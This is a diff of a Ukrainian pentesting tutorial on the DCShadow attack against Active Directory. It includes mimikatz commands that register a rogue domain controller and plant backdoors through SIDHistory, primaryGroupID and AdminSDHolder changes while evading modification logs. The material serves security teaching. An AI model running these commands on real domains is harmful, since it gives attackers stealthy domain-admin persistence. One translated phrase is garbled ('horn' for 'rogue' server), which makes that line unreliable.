@@ -16,10 +16,10 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 # DCShadow
 
-Він реєструє **новий контролер домену** в AD і використовує його для **поширення атрибутів** (SIDHistory, SPNs...) на вказаних об'єктах **без** залишення будь-яких **логів** щодо **модифікацій**. Вам **потрібні DA** привілеї та бути всередині **кореневого домену**.\
+Він реєструє **новий контролер домену** в AD і використовує його для **пушу атрибутів** (SIDHistory, SPNs...) на вказані об'єкти **без** залишення будь-яких **логів** щодо **модифікацій**. Вам **потрібні DA** привілеї і ви повинні бути всередині **кореневого домену**.\
 Зверніть увагу, що якщо ви використовуєте неправильні дані, з'являться досить неприємні логи.
 
-Для виконання атаки вам потрібно 2 екземпляри mimikatz. Один з них запустить RPC сервери з привілеями SYSTEM (тут потрібно вказати зміни, які ви хочете виконати), а інший екземпляр буде використаний для поширення значень:
+Щоб виконати атаку, вам потрібно 2 екземпляри mimikatz. Один з них запустить RPC сервери з привілеями SYSTEM (тут потрібно вказати зміни, які ви хочете виконати), а інший екземпляр буде використаний для пушу значень:
 
 {% code title="mimikatz1 (RPC servers)" %}
 ```bash
@@ -38,7 +38,7 @@ lsadump::dcshadow /push
 Зверніть увагу, що **`elevate::token`** не працюватиме в сесії `mimikatz1`, оскільки це підвищило привілеї потоку, але нам потрібно підвищити **привілей процесу**.\
 Ви також можете вибрати об'єкт "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-Ви можете внести зміни від DA або від користувача з мінімальними правами:
+Ви можете внести зміни від DA або від користувача з цими мінімальними правами:
 
 * В **об'єкті домену**:
 * _DS-Install-Replica_ (Додати/Видалити репліку в домені)
@@ -52,7 +52,7 @@ lsadump::dcshadow /push
 * _WriteProperty_ (Не записувати)
 
 Ви можете використовувати [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1), щоб надати ці привілеї непривілейованому користувачу (зверніть увагу, що це залишить деякі журнали). Це набагато більш обмежувально, ніж мати привілеї DA.\
-Наприклад: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Це означає, що ім'я користувача _**student1**_ при вході в машину _**mcorp-student1**_ має DCShadow привілеї над об'єктом _**root1user**_.
+Наприклад: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Це означає, що ім'я користувача _**student1**_ при вході в систему на машині _**mcorp-student1**_ має права DCShadow на об'єкт _**root1user**_.
 
 ## Використання DCShadow для створення бекдорів
 
@@ -62,7 +62,7 @@ lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-28053487
 ```
 {% endcode %}
 
-{% code title="Змінити PrimaryGroupID (додати користувача до членів Domain Administrators)" %}
+{% code title="Змінити PrimaryGroupID (додати користувача до групи Domain Administrators)" %}
 ```bash
 lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
@@ -77,7 +77,7 @@ lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attr
 ```
 {% endcode %}
 
-## Shadowception - Надати права DCShadow за допомогою DCShadow (без змінених журналів прав)
+## Shadowception - Надати DCShadow дозволи за допомогою DCShadow (без змінених журналів дозволів)
 
 Нам потрібно додати наступні ACE з SID нашого користувача в кінці:
 
@@ -87,11 +87,11 @@ lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attr
 * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
 * На об'єкті комп'ютера атакуючого: `(A;;WP;;;UserSID)`
 * На об'єкті цільового користувача: `(A;;WP;;;UserSID)`
-* На об'єкті Сайтів у контейнері Конфігурації: `(A;CI;CCDC;;;UserSID)`
+* На об'єкті Сайти в контейнері Конфігурація: `(A;CI;CCDC;;;UserSID)`
 
 Щоб отримати поточний ACE об'єкта: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
 
-Зверніть увагу, що в цьому випадку вам потрібно зробити **кілька змін,** а не лише одну. Тому, в **сесії mimikatz1** (RPC сервер) використовуйте параметр **`/stack` з кожною зміною,** яку ви хочете внести. Таким чином, вам потрібно буде **`/push`** лише один раз, щоб виконати всі накопичені зміни на ружому сервері.
+Зверніть увагу, що в цьому випадку вам потрібно зробити **кілька змін,** а не лише одну. Тому, в **сесії mimikatz1** (RPC сервер) використовуйте параметр **`/stack` з кожною зміною,** яку ви хочете внести. Таким чином, вам потрібно буде **`/push`** лише один раз, щоб виконати всі накопичені зміни на роговому сервері.
 
 
 
